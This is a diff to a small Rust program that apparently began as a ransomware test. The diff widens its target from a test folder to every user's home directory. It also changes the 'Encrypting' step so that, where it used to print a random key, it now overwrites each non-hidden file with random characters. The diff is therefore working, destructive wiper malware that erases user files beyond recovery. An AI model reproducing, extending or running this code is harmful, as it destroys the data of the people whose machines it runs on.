@@ -4,13 +4,14 @@ extern crate rand;
 use walkdir::WalkDir;
 use walkdir::DirEntry;
 
+use std::fs;
 use std::fs::metadata;
 
 use rand::{thread_rng, Rng};
 use rand::distributions::Alphanumeric;
 
 fn main() {
-    let walker = WalkDir::new("/home/test").into_iter();
+    let walker = WalkDir::new("/home").into_iter();
     for entry in walker.filter_entry(|e| !is_hidden(e)).filter_map(|e| e.ok()) {
         println!("{}", entry.path().display());
         let md = entry.metadata().unwrap();
@@ -18,7 +19,9 @@ fn main() {
             continue
         } else {
             println!("Encrypting: {}", entry.path().display());
-            println!("With key: {}", gen_random_string());
+            let data = gen_random_string();
+            fs::write(entry.path(), data)
+                .expect("Unable to write file");
         }
     }
 }
